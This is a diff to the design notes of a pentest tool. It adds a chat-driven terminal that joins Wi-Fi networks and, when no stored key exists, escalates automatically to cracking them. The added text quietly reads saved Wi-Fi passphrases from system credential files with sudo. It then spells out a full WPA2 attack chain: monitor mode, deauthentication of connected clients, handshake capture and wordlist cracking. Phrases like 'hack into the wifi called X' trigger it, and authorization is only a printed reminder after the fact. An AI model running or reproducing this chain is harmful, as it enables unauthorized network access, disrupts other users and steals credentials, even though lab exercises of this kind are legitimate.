@@ -42,6 +42,49 @@ Proven phrases:
 - `hack the dmz` → pentest on target/subnet
 - `watch for casting` → sniff (mdns/airplay/cast focus)
 
+## ASK RAVEN TERMINAL (Birdshit tab)
+
+`AskRavenTerm(QWidget)` — a mini terminal bolted onto the top of the Birdshit
+("penetration study") tab, plus the Crow tab's plain-language bar. One line and
+GO/Enter streams output + `[exit N]` (one command at a time).
+
+Gentle path — "nest at TELSU0773" (also `nest <ssid>`, `nest to wifi <ssid>`,
+`join the wifi named X`, `connect me to the wifi called X`, `bid me to nest at X`):
+find the wifi device, already-on-<ssid> short-circuit, then
+`nmcli dev wifi connect <ssid>`. On passphrase failure it pulls the saved key
+from the system store and retries quietly (`sudo -n cat
+/etc/NetworkManager/system-connections/<ssid>.nmconnection` or wpa_supplicant,
+regex `psk=`). The key is NEVER echoed/logged.
+
+## BIRDSHIT LOUD PATH — crack your way back onto an authorized wifi
+
+When the stored key is absent, `nest` escalates AUTOMATICALLY (and it triggers
+directly from "crack wifi <ssid>", "brute force <ssid>", "penetrate <ssid>",
+"get back into <ssid>", "hack into the wifi called X"): WPA2 off-line crack,
+
+1. `nmcli dev wifi` → BSSID/channel (fields split on `\:` — nmcli escapes the
+   separator inside values; MAC must be unescaped or aireplay/aircrack reject it).
+2. `sudo airmon-ng check kill` then `sudo airmon-ng start <dev>` → parse
+   `monitor mode enabled on <mon>`.
+3. background `sudo airodump-ng --bssid B -c CH -w /tmp/ravenheart/pen/nest <mon>`
+   (`_cap_proc`, NOT `self.proc`, so it survives the one-at-a-time guard and is
+   never wired to `_done`).
+4. up to 3 rounds of `sudo aireplay-ng -0 8 -a B --ignore-negative-one <mon>` +
+   7s; verify handshake via `aircrack-ng <cap>` (no `-w`) → "(1 handshake".
+5. `aircrack-ng -b B -w <list> <cap>` through wifite.txt → fasttrack.txt →
+   john.lst (KEY FOUND regex `KEY FOUND!\s*\[\s*([^\]]+?)\s*\]`; `_drain` also
+   buffers pen output into `pen["log"]` for the parse).
+6. `airmon-ng stop` + `systemctl restart NetworkManager`, then
+   `nmcli dev wifi connect <ssid> password <key>`; prints MAC-free ip, a
+   "confirm you own/authorize" line, and the recovered passphrase once (that's
+   the point of the exercise).
+
+Honest limits: only works if the passphrase is in the installed lists — a strong
+one won't crack. Standard lab playbook: instructor sets a rockyou-ish password.
+Radio is a single wlan0 (monitor drops the current connection — normally the
+point). Environment verified: aircrack-ng suite, reaver, hashcat, and
+/usr/share/wordlists (wifite.txt / fasttrack.txt / john.lst / rockyou.txt.gz).
+
 ## Human-readable briefing (CrowView)
 
 `human_brief(text)` parses the crow transcript into plain-English analyst lines:
